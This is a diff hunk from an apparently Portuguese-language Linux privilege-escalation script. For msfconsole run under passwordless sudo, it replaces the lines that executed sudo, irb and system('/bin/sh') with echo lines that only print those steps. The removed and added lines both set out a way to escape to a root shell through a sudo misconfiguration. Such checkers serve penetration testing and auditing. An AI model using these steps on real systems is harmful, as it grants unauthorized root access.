@@ -1950,10 +1950,10 @@ EOF
             sudo "$paths"
             ;;
         msfconsole)
-            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            irb
-            system("/bin/sh")
+            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
+            echo "sudo "$paths""
+            echo "irb"
+            echo "system("/bin/sh")"
             ;;
         msgattrib)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
